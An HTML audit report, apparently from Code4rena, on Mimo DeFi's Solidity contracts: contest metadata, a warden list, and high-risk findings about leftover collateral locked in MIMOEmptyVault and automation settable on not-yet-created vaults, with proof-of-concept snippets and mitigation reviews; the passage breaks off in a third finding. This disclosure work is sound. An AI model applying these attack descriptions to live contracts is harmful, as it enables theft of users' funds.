{
  "circa": {
    "title": "Mimo DeFi contest",
    "sponsor": "Mimo DeFi",
    "slug": "2022-08-mimo",
    "date": "2022-10-17",
    "findings": "https://github.com/code-423n4/2022-08-mimo-findings/issues",
    "contest": 150
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Mimo Defi smart contract system written in Solidity. The audit contest took place between August 2—August 7 2022.</p>\n<p>Following the C4 audit contest, warden horsefacts reviewed the mitigations for all identified issues; the mitigation review report is appended below the audit contest report.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>69 Wardens contributed reports to the Mimo Defi contest:</p>\n<ol>\n<li>vlad_bochok</li>\n<li>Lambda</li>\n<li>ayeslick</li>\n<li>Bnke0x0</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>0x52</li>\n<li>horsefacts</li>\n<li>0xDjango</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li>cccz</li>\n<li>arcoun</li>\n<li>byndooa</li>\n<li><a href=\"https://twitter.com/thebensams\">thebensams</a></li>\n<li>IllIllI</li>\n<li>peritoflores</li>\n<li><a href=\"https://twitter.com/BowTiedDravee\">Dravee</a></li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li><a href=\"https://twitter.com/giovannidisiena\">giovannidisiena</a></li>\n<li>mics</li>\n<li>JohnSmith</li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li><a href=\"https://twitter.com/0xteddav\">teddav</a></li>\n<li>rbserver</li>\n<li><a href=\"https://twitter.com/sm4rtcontr4ct\">JC</a></li>\n<li>ajtra</li>\n<li>NoamYakov</li>\n<li>Rolezn</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li><a href=\"https://www.linkedin.com/in/georgi-nikolaev-georgiev-978253219\">gogo</a></li>\n<li>0x1f8b</li>\n<li>bobirichman</li>\n<li>ReyAdmirado</li>\n<li>sikorico</li>\n<li><a href=\"https://github.com/lyciumlee\">durianSausage</a></li>\n<li>simon135</li>\n<li>CodingNameKiki</li>\n<li>Waze</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://instagram.com/vanensurya\">Funen</a></li>\n<li>brgltd</li>\n<li>ladboy233</li>\n<li>0xc0ffEE</li>\n<li><a href=\"https://chom.dev\">Chom</a></li>\n<li>samruna</li>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li>ak1</li>\n<li>delfin454000</li>\n<li><a href=\"https://twitter.com/Sm4rty_\">Sm4rty</a></li>\n<li>bulej93</li>\n<li><a href=\"https://twitter.com/natzuu33\">natzuu</a></li>\n<li><a href=\"https://twitter.com/ROHANJH56009256\">Rohan16</a></li>\n<li><a href=\"https://github.com/TomAFrench\">TomFrenchBlockchain</a></li>\n<li><a href=\"https://twitter.com/dediranTofunmi\">tofunmi</a></li>\n<li>nxrblsrpr</li>\n<li>erictee</li>\n<li>_141345_</li>\n<li>SooYa</li>\n<li>wagmi</li>\n<li>aysha</li>\n<li>jag</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/0xheynacho\">ignacio</a></li>\n<li>bearonbike</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li><a href=\"https://twitter.com/fitraldys\">Fitraldys</a></li>\n<li>0x040</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/gzeon\">gzeon</a>.</p>\n<p>Mitigations reviewed by horsefacts.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a> and <a href=\"https://twitter.com/itsmetechjay\">itsmetechjay</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 12 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 50 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 40 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-08-mimo\">C4 Mimo Defi contest repository</a>, and is composed of 27 smart contracts written in the Solidity programming language and includes 1,714 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-4\" style=\"position:relative;\"><a href=\"#high-risk-findings-4\" aria-label=\"high risk findings 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (4)</h1>\n<h2 id=\"h-01-mimoemptyvaultsol-executeoperation-does-not-transfer-the-vault-leftover-assets-to-the-owner-it-is-locked-in-the-mimoemptyvault\" style=\"position:relative;\"><a href=\"#h-01-mimoemptyvaultsol-executeoperation-does-not-transfer-the-vault-leftover-assets-to-the-owner-it-is-locked-in-the-mimoemptyvault\" aria-label=\"h 01 mimoemptyvaultsol executeoperation does not transfer the vault leftover assets to the owner it is locked in the mimoemptyvault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/18\">[H-01] <code>MIMOEmptyVault.sol executeOperation()</code> does not transfer the Vault leftover assets to the owner, it is locked in the <code>MIMOEmptyVault</code></a></h2>\n<p><em>Submitted by bin2chen, also found by Bnke0x0</em></p>\n<p><code>MIMOEmptyVault.sol executeAction()</code> is supposed to pay off the debt and return the leftover assets to the owner of the Vault.\nBut in fact the emptyVault contract, after executing the executionOperation(), only pays back the flash loan, and does not transfer the leftover assets to the owner, and locked in the emptyVault contract.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function executeOperation(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address[] calldata assets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] calldata amounts,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] calldata premiums,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address initiator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes calldata params</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external override returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(flashloanRepayAmount &lt;= vaultCollateral.balanceOf(address(this)), Errors.CANNOT_REPAY_FLASHLOAN);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vaultCollateral.safeIncreaseAllowance(address(lendingPool), flashloanRepayAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    //****Paid off the flash loan but did not transfer the remaining balance back to mimoProxy or owner ***//</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>Add logs to test case</p>\n<p>test/02_integration/MIMOEmtpyVault.test.ts</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  it(&quot;should be able to empty vault with 1inch&quot;, async () =&gt; {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ++++ console.log(&quot;before emptyVault balance:---&gt;&quot;, (await wmatic.balanceOf(emptyVault.address)) + &quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const tx = await mimoProxy.execute(emptyVault.address, MIMOProxyData);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const receipt = await tx.wait(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ++++ console.log(&quot;after emptyVault balance: ---&gt;&quot;, (await wmatic.balanceOf(emptyVault.address)) + &quot;&quot;);  </span></span></code></pre>\n<p>print:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">before emptyVault balance:---&gt; 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">after emptyVault balance: ---&gt; 44383268870065355782</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function executeOperation(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address[] calldata assets,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] calldata amounts,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] calldata premiums,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address initiator,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes calldata params</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external override returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(flashloanRepayAmount &lt;= vaultCollateral.balanceOf(address(this)), Errors.CANNOT_REPAY_FLASHLOAN);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vaultCollateral.safeIncreaseAllowance(address(lendingPool), flashloanRepayAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    //****transfer the remaining balance back to mimoProxy or owner ***//</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ++++ vaultCollateral.safeTransfer(address(mimoProxy), vaultCollateral.balanceOf(address(this)) - flashloanRepayAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/18#issuecomment-1210512990\">RayXpub (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We confirm this is a vulnerability and intend to fix this - only the amount needed to repay the flashloan should be transferred from the <code>MimoProxy</code> to the <code>MIMOEmptyVault</code> action contract.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that <code>MIMOEmptyVault</code> transferred in a vault’s full collateral balance when repaying vault rebalance flash loans, but did not return excess collateral to the vault owner when the flash loan repayment amount was less than the vault’s collateral balance. Instead, the excess amount would be locked in the action contract.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team updated <code>MIMOEmptyVault#emptyVaultOperation</code> to transfer collateral exactly equal to the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMOEmptyVault.sol#L142\">flashloan repayment amount</a>, rather than the full vault balance. This behavior is demonstrated by an <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/test/02_integration/MIMOEmtpyVault.test.ts#L297\">integration test</a>.</p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since excess collateral is never transferred to <code>MIMOEmptyVault</code>, it can no longer be locked in the contract.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-automation--management-can-be-set-for-not-yet-existing-vault\" style=\"position:relative;\"><a href=\"#h-02-automation--management-can-be-set-for-not-yet-existing-vault\" aria-label=\"h 02 automation  management can be set for not yet existing vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/68\">[H-02] Automation / management can be set for not yet existing vault</a></h2>\n<p><em>Submitted by Lambda, also found by ayeslick</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/9adf46f2efc61898247c719f2f948b41d5d62bbe/contracts/actions/automated/MIMOAutoAction.sol#L33\">https://github.com/code-423n4/2022-08-mimo/blob/9adf46f2efc61898247c719f2f948b41d5d62bbe/contracts/actions/automated/MIMOAutoAction.sol#L33</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/9adf46f2efc61898247c719f2f948b41d5d62bbe/contracts/actions/managed/MIMOManagedAction.sol#L35\">https://github.com/code-423n4/2022-08-mimo/blob/9adf46f2efc61898247c719f2f948b41d5d62bbe/contracts/actions/managed/MIMOManagedAction.sol#L35</a></p>\n<h3 id=\"impact--proof-of-concept\" style=\"position:relative;\"><a href=\"#impact--proof-of-concept\" aria-label=\"impact  proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact &#x26; Proof Of Concept</h3>\n<p><code>vaultOwner</code> returns zero for a non-existing <code>vaultId</code>. Similarly, <code>proxyRegistry.getCurrentProxy(msg.sender)</code> returns zero when <code>msg.sender</code> has not deployed a proxy yet. Those two facts can be combined to set automation for a vault ID that does not exist yet. When this is done by a user without a proxy, it will succeed, as both <code>vaultOwner</code> and <code>mimoProxy</code> are <code>address(0)</code>, i.e. we have <code>vaultOwner == mimoProxy</code>.</p>\n<p>The consequences of this are quite severe. As soon as the vault is created, it will be an automated vault (with potentially very high fees). An attacker can exploit this by setting very high fees before the creation of the vault and then performing actions for the automated vault, which leads to a loss of funds for the user.</p>\n<p>The same attack is possible for <code>setManagement</code>.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Do not allow setting automation parameters for non-existing vaults, i.e. check that <code>vaultOwner != address(0)</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/68#issuecomment-1210497317\">RayXpub (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We confirm that this is a high risk issue and intend to fix this.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved after review (see finding M.H-01 in Mitigation Review section below)</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that malicious callers could configure automation and management parameters for uninitialized vaults when vault owner and proxy address were unset for a given vault ID and caller and returned <code>adress(0)</code>, which caused an access control check to unintentionally pass.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> <code>MIMOAutoAction#setAutomation</code> now <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/actions/automated/MIMOAutoAction.sol#L34\">checks</a> whether the vault owner is the zero address. An <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/02_integration/automated/MIMOAutoActionSecurity.test.ts#L119\">integration test</a> demonstrates that attempting to call <code>setAutomation</code> on an uninitialized vault will revert. <code>MIMOManagedAction#setAutomation</code> performs the same <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/contracts/actions/managed/MIMOManagedAction.sol#L37\">check</a>, and an <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/test/01_unit/managed/MIMOManagedAction.test.ts#L123\">integration test</a> exercises it.  </p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since <code>setAutomation</code> now explicitly checks that the vault is initialized, configuration cannot be set for an uninitialized vault.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-registrysol-fails-to-deliver-expected-functionality\" style=\"position:relative;\"><a href=\"#h-03-registrysol-fails-to-deliver-expected-functionality\" aria-label=\"h 03 registrysol fails to deliver expected functionality permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 